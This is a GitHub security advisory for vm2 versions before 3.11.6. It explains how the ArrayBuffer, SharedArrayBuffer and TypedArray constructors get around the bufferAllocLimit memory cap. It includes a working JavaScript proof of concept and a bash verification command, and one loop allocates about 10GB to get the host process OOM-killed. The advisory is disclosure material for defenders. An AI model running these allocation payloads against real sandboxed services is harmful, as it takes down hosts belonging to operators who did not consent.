# [H] vm2 has Memory Exhaustion DoS via bufferAllocLimit Bypass

## Summary
Severity: High
Advisory: GHSA-v836-6xw4-9cx3
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-v836-6xw4-9cx3
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.6

## Details
### Summary:

The `bufferAllocLimit` defense (GHSA-6785-pvv7-mvg7) can be completely bypassed using `ArrayBuffer`, `SharedArrayBuffer`, or any `TypedArray` constructor. These allocate identical host-process RSS through the same V8/libuv C++ allocation path as `Buffer.alloc` but are not subject to the size cap.

### Details:

The `bufferAllocLimit` option (vm2 v3.11.0+) caps `Buffer.alloc`, `Buffer.allocUnsafe`, `Buffer.allocUnsafeSlow`, and the deprecated `Buffer(N)` / `new Buffer(N)` forms. The cap is enforced in `setup-sandbox.js` via `checkBufferAllocLimit()` (line 353-359).

However, `ArrayBuffer`, `SharedArrayBuffer`, `Uint8Array`, `Float64Array`, and all other TypedArray constructors are sandbox-realm V8 intrinsics that allocate host memory through the SAME underlying C++ path (`v8::ArrayBuffer::NewBackingStore` → `ArrayBufferAllocator::Allocate` → `calloc/malloc`). These constructors are NOT intercepted by the `bufferAllocLimit` defense.

A single `new ArrayBuffer(N)` call with a large `N` exhausts host RSS in one synchronous allocation that V8's `timeout` cannot interrupt.

### Environment:

- vm2 version: 3.11.3
- Node.js: v25.8.1 (affects all Node.js versions)
- Configuration: Default `new VM()` or any configuration including `bufferAllocLimit`

### POC:

```javascript
const { VM } = require('vm2');

// Operator sets bufferAllocLimit thinking they're protected:
const vm = new VM({ bufferAllocLimit: 10 * 1024 * 1024 }); // 10MB cap

// Buffer.alloc IS capped (as intended):
try { vm.run('Buffer.alloc(20 * 1024 * 1024)'); }
catch(e) { console.log('Buffer.alloc blocked:', e.message); }
// → "Buffer allocation size 20971520 exceeds bufferAllocLimit 10485760"

// But these BYPASS the cap entirely:
vm.run('new ArrayBuffer(1024 * 1024 * 1024)');        // 1GB allocated!
vm.run('new SharedArrayBuffer(1024 * 1024 * 1024)');  // 1GB allocated!
vm.run('new Uint8Array(1024 * 1024 * 1024)');         // 1GB allocated!
vm.run('new Float64Array(128 * 1024 * 1024)');        // 1GB allocated!

// OOM kill in constrained environments (Docker, K8s, Lambda):
vm.run('var a=[]; for(var i=0;i<100;i++) a.push(new ArrayBuffer(100*1024*1024))');
// → 10GB allocated → host OOM killed
```

**Verification:**

```bash
node -e '
const {VM} = require("./lib/main.js");
const vm = new VM({bufferAllocLimit: 10*1024*1024});
try { vm.run("Buffer.alloc(20*1024*1024)"); } catch(e) { console.log("Buffer BLOCKED"); }
console.log("ArrayBuffer:", vm.run("new ArrayBuffer(100*1024*1024).byteLength"), "bytes allocated");
console.log("SharedArrayBuffer:", vm.run("new SharedArrayBuffer(100*1024*1024).byteLength"), "bytes allocated");
'
# Output:
# Buffer BLOCKED
# ArrayBuffer: 104857600 bytes allocated
# SharedArrayBuffer: 104857600 bytes allocated
```

### Impact:

- **Type:** Denial of Service (Host Memory Exhaustion)
- **Attack Complexity:** Low
- **Availability Impact:** Complete, host process OOM killed in memory-constrained environments
- **Affected deployments:** Docker containers, Kubernetes pods, AWS Lambda, any environment with memory limits. Especially dangerous when operators explicitly set `bufferAllocLimit` believing they have DoS protection.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-v836-6xw4-9cx3
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/3.11.6
